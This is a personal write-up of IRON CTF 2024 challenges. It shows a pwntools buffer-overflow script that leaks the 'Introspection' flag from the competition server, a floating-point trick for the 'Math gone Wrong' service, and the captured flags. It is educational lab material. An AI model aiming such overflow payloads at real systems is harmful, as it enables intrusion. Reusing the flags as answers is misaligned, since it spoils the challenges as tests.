<div align="center">
    <h1>IRON CTF 2024 (Online Jeopardy CTF)<h1>
    <img src="https://github.com/user-attachments/assets/21e914c3-1573-4f14-862c-a2f98d44a225" alt="TEAM RANKINGS" />
</div>

Here are the challenges that I solved in this competition.

---
## Welcome

The flag was already posted on the discord Rules section:
<div align="center">
    <img src="https://github.com/user-attachments/assets/734480ab-4b68-4be2-97d8-6ec051e638c0" alt="TEAM RANKINGS" />
</div>

### FLAG = `ironCTF{W3lc0m3_t0_ir0nCTF_2024}`
---
### Introspection
<div align="center">
    <img src="https://github.com/user-attachments/assets/e1657ecf-12f4-4de4-9465-77d1bcd140c5" alt="Introspection" />
</div>

They provided us with an ELF file, a C++ Sorce file, and a Fake Flag file
```
┌──(kali㉿LEOPARD-PC)-[~/ironCTF/introspection-COMPLETED]
└─$ ls -al
total 40
drwxr-xr-x  2 kali kali  4096 Oct  5 14:38 .
drwxr-xr-x 18 kali kali  4096 Oct  5 21:21 ..
-rw-r--r--  1 kali kali    25 Sep 30 19:19 flag.txt
-rwxr-xr-x  1 kali kali 16328 Sep 30 19:11 introspection
-rw-r--r--  1 kali kali   776 Sep 30 19:09 introspection.c
-rw-r--r--  1 kali kali  3637 Oct  1 00:34 Introspection.zip
-rw-r--r--  1 kali kali   283 Oct  5 14:38 solve.py
```


The ELF Executable binary had the following properties:
```
┌──(kali㉿LEOPARD-PC)-[~/ironCTF/introspection-COMPLETED]
└─$ file introspection
introspection: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e7b67e6360915273fd8e5e41cebf3492358405bb, for GNU/Linux 3.2.0, not stripped

┌──(kali㉿LEOPARD-PC)-[~/ironCTF/introspection-COMPLETED]
└─$ checksec introspection
[*] '/home/kali/ironCTF/introspection-COMPLETED/introspection'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```
Running the binary got s these results:
```
┌──(kali㉿LEOPARD-PC)-[~/ironCTF/introspection-COMPLETED]
└─$ ./introspection
"Introspection is the key to unlocking your fullest potential; knowing yourself is the first step."

                                                                                         - ChatGPT
Have you thought about what you really wanted in life?
>> To become a good reverse-engineer and pwner one day
I wish for you that you get To become a good reverse-engineer and pwner one day
```

After analyzing the file in Ghidra, I realized I could get the flag by simply overflowing the input buffer since the flag variable is right above the input variable in the stack:
<div align="center">
    <img src="https://github.com/user-attachments/assets/2a1f5e6a-bbc0-409f-a6be-36935d5d2a98" alt="Ghidra Analysis" />
</div>

```
undefined8 main(void){
  undefined input [1008];
  undefined file_data [56];
  FILE *file;
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  puts("\x1b[32m\"Introspection is the key to unlocking your fullest potential; knowing yourself is the first step.\"\x1b[0m\n");
  puts("                                                                                                            - Ch atGPT");
  puts("Have you thought about what you really wanted in life?");
  file = fopen("flag.txt","r");
  if (file == (FILE *)0x0) {
    printf("Error! flag.txt not found!");
    exit(1);
  }
  fread(file_data,1,0x32,file);
  printf(">> ");
  read(0,input,0x3f0);
  printf("I wish for you that you get %s",input);
  return 0;
}
```

So I started a new solve.py file with nano and wrote this script with the pwntools library, to get the buffer overflow:
```
┌──(kali㉿LEOPARD-PC)-[~/ironCTF/introspection-COMPLETED]
└─$ cat solve.py
from pwn import *

#io = process("./introspection")
io = remote("pwn.1nf1n1ty.team", 31698)
payload = (b"A" * 1008)
payload += (b"B" * 4)

io.recvuntil(b">> ")
io.sendline(payload)
io.interactive()
```

Here is the Output of the script:
```
┌──(kali㉿LEOPARD-PC)-[~/ironCTF/introspection-COMPLETED]
└─$ python3 solve.py
[+] Opening connection to pwn.1nf1n1ty.team on port 31698: Done
[*] Switching to interactive mode
I wish for you that you get AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAironCTF{W0w!_Y0u_Just_OverWrite_the_Nul1!}
\xc8\x13\x7f[*] Got EOF while reading in interactive
$ ls
$ whoami
$ w
[*] Closed connection to pwn.1nf1n1ty.team port 31698
[*] Got EOF while sending in interactive
```

### FLAG = `ironCTF{W0w!_Y0u_Just_OverWrite_the_Nul1!}`

---

## Math gone Wrong
<div align="center">
    <img src="https://github.com/user-attachments/assets/aead698d-9df1-4136-a5a7-ce7ed73d4c08" alt="Math Gone Wrong" />
</div>

When we connect to the Netcat Instance, It simply prompts us to enter two numbers and then based on a condition gives us the flag:

```
┌──(kali㉿LEOPARD-PC)-[~/ironCTF/Algebra-Math-COMPLETED]
└─$ nc misc.1nf1n1ty.team 30011
Enter frist number (n1) > 1
Enter second number (n2) > 2
n1*10+n2*10 != (n1+n2)*10
above condition is false so no flag
```

After playing around for i realized the numbers taken as input are being interpreted as integers, So I tried using float values, and I was right:

```
┌──(kali㉿LEOPARD-PC)-[~/ironCTF/Algebra-Math-COMPLETED]
└─$ cat solve
┌──(kali㉿LEOPARD-PC)-[~/ironCTF]
└─$ nc misc.1nf1n1ty.team 30011
Enter frist number (n1) > 0.656565
Enter second number (n2) > 0.4686546
b'ironCTF{s1mpl3_r3m4ind3r_70_b3w4r3_0f_fl047ing_p0in7_3rr0r}'
```

### FLAG = `ironCTF{s1mpl3_r3m4ind3r_70_b3w4r3_0f_fl047ing_p0in7_3rr0r}`
